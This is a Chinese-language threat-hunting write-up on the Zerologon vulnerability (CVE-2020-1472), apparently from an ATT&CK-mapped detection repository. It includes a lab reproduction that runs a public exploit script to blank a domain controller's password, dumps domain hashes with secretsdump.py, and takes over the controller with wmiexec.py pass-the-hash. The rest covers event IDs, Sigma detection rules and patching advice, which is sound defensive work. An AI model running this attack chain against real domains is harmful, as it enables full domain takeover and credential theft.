# T1134.001-Win-CVE-2020-1472

## 描述

攻击者可能通过复制并冒充另一个用户的令牌来提升特权并绕过访问控制。攻击者可以使用`DuplicateToken(Ex)`函数创建新的访问令牌，复制现有令牌。然后，该令牌可通过`ImpersonateLoggedOnUser`使调用线程模拟已登录用户的安全上下文，或通过`SetThreadToken`将模拟令牌分配给线程。

当攻击者拥有一个特定的现有进程并希望将新令牌分配给该进程时，这种技术尤为有效。例如，当目标用户在系统上具有非网络登录会话时，攻击者可能利用此方法。

## 测试案例

2020年9月11日，安全研究员Secura发布公告，详细说明了Microsoft于2020年8月修补的漏洞（CVE-2020-1472）。该漏洞被称为“Zerologon”，CVSS评分高达10.0，因其能在短时间内（号称3秒）攻陷域控制器（DC），危害极大。攻击者可通过NetLogon（MS-NRPC）协议与活动目录（AD）域控制器建立安全通道时，利用该漏洞将域控制器的计算机账号密码置为空，从而完全控制域控制器。本文从漏洞原理、复现过程和威胁狩猎三个方面对该漏洞进行分析。

具体内容可参考安全客文章：[Zerologon分析与狩猎](https://www.anquanke.com/post/id/219090#h2-2)。

## 检测日志

- **Windows 系统日志**：通过Windows事件查看器中的系统日志捕获相关事件。
- **全流量日志**：通过网络流量分析工具（如Zeek）捕获NetLogon协议的异常请求。

此外，Microsoft在2020年8月的补丁中新增了五个事件ID，用于监控易受攻击的NetLogon连接：
1. **Event ID 5829**：允许存在漏洞的NetLogon安全通道连接时触发。
2. **Event ID 5827/5828**：拒绝易受攻击的NetLogon连接时触发。
3. **Event ID 5830/5831**：允许存在漏洞的NetLogon连接时触发。

如果域控制器已安装相关补丁，可通过上述事件ID进行威胁狩猎。

## 测试复现

以下复现过程参考安全客文章：[Zerologon分析与狩猎](https://www.anquanke.com/post/id/219090#h2-2)。

### 实验环境

```yaml
域控制器：
  系统：Windows Server 2012 R2（x64）
  IP：10.10.10.10
  主机名：DC
  域：de1ay.com
```

![Windows域控](https://p4.ssl.qhimg.com/t01d53a30398ec357a2.jpg)

```yaml
攻击机：
  系统：Ubuntu 16.04（x64）
  IP：10.10.10.111
```

![攻击机](https://p4.ssl.qhimg.com/t019275a00ca38b1d6b.jpg)

### 复现步骤

1. **运行漏洞利用脚本**  
   使用公开的CVE-2020-1472漏洞利用脚本，将域控制器机器账户（DC）的密码置为空：

   ```bash
   python3 cve-2020-1472-exploit.py DC 10.10.10.10
   ```

   ![漏洞利用](https://p0.ssl.qhimg.com/t01f402a9c7c4c3b532.jpg)

2. **导出域内凭据**  
   域控制器账户密码置为空后，可视为已知密码，使用`secretsdump.py`导出域内所有用户凭据：

   ```bash
   python3 secretsdump.py de1ay/DC\$@10.10.10.10 -no-pass
   ```

   ![凭据导出](https://p0.ssl.qhimg.com/t01497ee0714e6f98cc.jpg)

   导出的哈希中，DC账户的NTLM哈希为`31d6cfe0d16ae931b73c59d7e0c089c0`，表示空密码。同时，获得了域管理员（Administrator）的哈希。

3. **利用域管理员哈希控制域控**  
   使用域管理员的NTLM哈希通过`wmiexec.py`登录域控制器，完成接管：

   ```bash
   python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10
   ```

   ![域控接管](https://p5.ssl.qhimg.com/t0140b167f7020733c8.jpg)

## 测试留痕

暂无具体留痕描述，建议参考安全客文章：[Zerologon分析与狩猎](https://www.anquanke.com/post/id/219090#h2-2)。

可能的留痕包括：
- Windows系统日志中的NetLogon相关事件（Event ID 5827–5831）。
- 网络流量中异常的NetLogon协议请求（如大量`NetrServerReqChallenge`或`NetrServerAuthenticate3`请求）。

## 检测规则/思路

### Sigma规则

#### 检测规则1：Zeek检测异常NetLogon请求

```yaml
title: Possible CVE-2020-1472 (Zerologon)
description: CVE-2020-1472 (Netlogon Elevation of Privilege Vulnerability) may create thousands of NetrServerReqChallenge & NetrServerAuthenticate3 requests in a short amount of time.
author: SOC Prime Team
date: 2020/09/11
references:
  - https://github.com/SecuraBV/CVE-2020-1472
tags:
  - attack.lateral_movement
  - attack.t1210
logsource:
  product: zeek
  service: dce_rpc
detection:
  selection:
    endpoint: 'netlogon'
    operation: 'NetrServerReqChallenge'
  selection2:
    endpoint: 'netlogon'
    operation: 'NetrServerAuthenticate3'
  timeframe: 1m
  condition: selection or selection2 | count() by src_ip > 100
falsepositives:
  - Unknown
level: high
```

#### 检测规则2：Windows系统日志检测

```yaml
title: Vulnerable Netlogon Secure Channel Connection Allowed
id: a0cb7110-edf0-47a4-9177-541a4083128a
status: experimental
description: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472.
references:
  - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc
author: NVISO
date: 2020/09/15
tags:
  - attack.privilege_escalation
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID:
      - 5829 # 需域控安装补丁后生效
  condition: selection
fields:
  - SAMAccountName
falsepositives:
  - Unknown
level: high
```

### 建议

1. **立即应用补丁**：确保所有域控制器安装了2020年8月或之后的Microsoft安全更新（KB4571729等），以修复CVE-2020-1472漏洞。
2. **启用NetLogon日志**：在域控制器上启用详细的NetLogon日志记录，监控Event ID 5827–5831。
3. **部署网络监控**：使用Zeek或其他网络流量分析工具，检测异常的NetLogon协议请求（如短时间内大量`NetrServerReqChallenge`或`NetrServerAuthenticate3`请求）。
4. **审查机器账户活动**：定期检查域控制器机器账户的异常登录或密码重置行为。
5. **实施SIEM系统**：结合Sigma规则，使用SIEM系统（如Splunk、Elastic）实时监控和分析相关事件。
6. **测试规则效果**：上述Sigma规则未在真实环境中广泛验证，建议在测试环境中验证其有效性，并根据实际环境调整阈值以减少误报。

## 参考推荐

- MITRE ATT&CK: T1134.001  
  <https://attack.mitre.org/techniques/T1134/001/>
- Zerologon（CVE-2020-1472）分析与狩猎  
  <https://www.anquanke.com/post/id/219090#h2-2>
- Sigma规则：CVE-2020-1472  
  <https://github.com/Neo23x0/sigma/blob/2cd9b794e677a038f3ace5b15d649ca191809846/rules/windows/builtin/win_vul_cve_2020_1472.yml>
- Microsoft NetLogon补丁说明  
  <https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc>
